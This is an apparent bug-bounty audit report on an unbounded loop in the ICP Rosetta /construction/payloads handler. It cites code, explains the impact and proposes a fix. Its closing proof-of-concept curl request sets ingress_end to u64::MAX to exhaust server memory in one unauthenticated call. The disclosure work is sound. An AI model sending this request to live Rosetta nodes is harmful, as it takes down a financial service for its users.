Audit Report

## Title
Unbounded ingress-window loop in ICP Rosetta `/construction/payloads` allows unauthenticated OOM/CPU DoS — (`rs/rosetta-api/icp/src/request_handler/construction_payloads.rs`)

## Summary
The ICP Rosetta `construction_payloads()` handler accepts attacker-controlled `ingress_start` and `ingress_end` nanosecond timestamps from request metadata and feeds them directly into an unbounded `while now < ingress_end` loop with no cap on the window size. Sending `ingress_start=0` and `ingress_end=u64::MAX` causes approximately 154 million loop iterations that push `u64` values into a `Vec`, allocating over 1 GB of heap memory in a single synchronous request handler, crashing or hanging the Rosetta server process.

## Finding Description
In `construction_payloads()`, the interval is computed as:

```rust
let interval =
    ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
``` [1](#0-0) 

This yields `300s - 60s - 120s = 120s = 120,000,000,000 ns`. The `ingress_start` and `ingress_end` values are taken directly from attacker-supplied metadata with no validation:

```rust
let ingress_start = meta
    .as_ref()
    .and_then(|meta| meta.ingress_start)
    .map(ic_types::time::Time::from_nanos_since_unix_epoch)
    .unwrap_or_else(ic_types::time::current_time);

let ingress_end = meta
    .as_ref()
    .and_then(|meta| meta.ingress_end)
    .map(ic_types::time::Time::from_nanos_since_unix_epoch)
    .unwrap_or_else(|| ingress_start + interval);
``` [2](#0-1) 

These values are then used directly in an unbounded loop:

```rust
let mut ingress_expiries = vec![];
let mut now = ingress_start;
while now < ingress_end {
    let ingress_expiry = (now
        + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
    .as_nanos_since_unix_epoch();
    ingress_expiries.push(ingress_expiry);
    now += interval;
}
``` [3](#0-2) 

There is no check on `ingress_start >= ingress_end`, no cap on `ingress_end - ingress_start`, and no maximum iteration count. With `ingress_start=0` and `ingress_end=18446744073709551615` (`u64::MAX`):

- Iterations: `18,446,744,073,709,551,615 / 120,000,000,000 ≈ 153,722,867`
- Memory for `ingress_expiries` alone: `153,722,867 × 8 bytes ≈ 1.23 GB`
- The `payloads` and `updates` vecs are then populated per-expiry per-transaction, multiplying the allocation further.

The `ConstructionPayloadsRequestMetadata` struct exposes `ingress_start` and `ingress_end` as plain `Option<u64>` fields deserialized from JSON with no range checks: [4](#0-3) 

The ICRC1 Rosetta implementation performs ordering and minimum-window checks before its equivalent loop: [5](#0-4) 

The ICP Rosetta path has no equivalent guards whatsoever.

## Impact Explanation
A single unauthenticated HTTP POST to the publicly reachable `/construction/payloads` endpoint triggers OOM allocation (~1.2 GB minimum) in the synchronous request handler, crashing or hanging the Rosetta server process. This constitutes an application/platform-level DoS of the ICP Rosetta financial integration component — a concrete, non-volumetric, single-request crash of the Rosetta server. This matches the **High ($2,000–$10,000)** impact class: "Application/platform-level DoS, crash... or subnet availability impact not based on raw volumetric DDoS" and "Significant... Rosetta... security impact with concrete user or protocol harm."

## Likelihood Explanation
The endpoint requires no authentication or credentials. The malicious payload is trivially constructed with two integer fields. No rate-limit bypass, no volumetric traffic, and no special privileges are required — a single HTTP request suffices. The attack is immediately repeatable if the process is restarted.

## Recommendation
Add a window-size cap immediately after computing `ingress_start`/`ingress_end`, before the loop. At minimum, reject requests where the window exceeds `MAX_INGRESS_TTL` (300 seconds), which is the legitimate maximum for a single ingress window:

```rust
if ingress_start >= ingress_end {
    return Err(ApiError::invalid_request(
        "ingress_start must be before ingress_end",
    ));
}
let max_window = ic_limits::MAX_INGRESS_TTL.as_nanos() as u64;
if ingress_end.as_nanos_since_unix_epoch()
    .saturating_sub(ingress_start.as_nanos_since_unix_epoch()) > max_window
{
    return Err(ApiError::invalid_request(
        "ingress_end - ingress_start exceeds the maximum allowed window",
    ));
}
```

## Proof of Concept
```bash
curl -X POST http://<rosetta-host>:8080/construction/payloads \
  -H 'Content-Type: application/json' \
  -d '{
    "network_identifier": {"blockchain":"Internet Computer","network":"00000000000000020101"},
    "operations": [
      {"operation_identifier":{"index":0},"type":"TRANSACTION","account":{"address":"<valid-addr>"},"amount":{"value":"-1","currency":{"symbol":"ICP","decimals":8}}},
      {"operation_identifier":{"index":1},"type":"TRANSACTION","account":{"address":"<valid-addr>"},"amount":{"value":"1","currency":{"symbol":"ICP","decimals":8}}}
    ],
    "public_keys": [{"hex_bytes":"<valid-pubkey>","curve_type":"edwards25519"}],
    "metadata": {
      "ingress_start": 0,
      "ingress_end": 18446744073709551615
    }
  }'
```

The server process will exhaust available heap memory (~1.2 GB minimum for `ingress_expiries` alone) and crash or become unresponsive before returning a response. A unit test can reproduce this deterministically by calling `construction_payloads()` directly with `ingress_start=0` and `ingress_end=u64::MAX` and asserting it returns an error rather than allocating unboundedly.

### Citations

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L59-60)
```rust
        let interval =
            ic_limits::MAX_INGRESS_TTL - ic_limits::PERMITTED_DRIFT - Duration::from_secs(120);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L74-84)
```rust
        let ingress_start = meta
            .as_ref()
            .and_then(|meta| meta.ingress_start)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(ic_types::time::current_time);

        let ingress_end = meta
            .as_ref()
            .and_then(|meta| meta.ingress_end)
            .map(ic_types::time::Time::from_nanos_since_unix_epoch)
            .unwrap_or_else(|| ingress_start + interval);
```

**File:** rs/rosetta-api/icp/src/request_handler/construction_payloads.rs (L99-107)
```rust
        let mut ingress_expiries = vec![];
        let mut now = ingress_start;
        while now < ingress_end {
            let ingress_expiry = (now
                + ic_limits::MAX_INGRESS_TTL.saturating_sub(ic_limits::PERMITTED_DRIFT))
            .as_nanos_since_unix_epoch();
            ingress_expiries.push(ingress_expiry);
            now += interval;
        }
```

**File:** rs/rosetta-api/icp/src/models.rs (L199-223)
```rust
/// Typed metadata of ConstructionPayloadsRequest.
#[derive(Clone, Eq, PartialEq, Debug, Default, Deserialize, Serialize)]
pub struct ConstructionPayloadsRequestMetadata {
    /// The memo to use for a ledger transfer.
    /// A random number is used by default.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub memo: Option<u64>,

    /// The earliest acceptable expiry date for a ledger transfer.
    /// Must be within 24 hours from created_at_time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ingress_start: Option<u64>,

    /// The latest acceptable expiry date for a ledger transfer.
    /// Must be within 24 hours from created_at_time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ingress_end: Option<u64>,

    /// If present, overrides ledger transaction creation time.
    /// Represents number of nanoseconds since UNIX epoch.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub created_at_time: Option<u64>,
}
```

**File:** rs/rosetta-api/icrc1/src/construction_api/services.rs (L148-158)
```rust
    if ingress_start >= ingress_end {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress start should start before ingress end: Start: {ingress_start}, End: {ingress_end}"
        )));
    }

    if ingress_end < now + ingress_interval {
        return Err(Error::processing_construction_failed(&format!(
            "Ingress end should be at least one interval from the current time: Current time: {now}, End: {ingress_end}"
        )));
    }
```
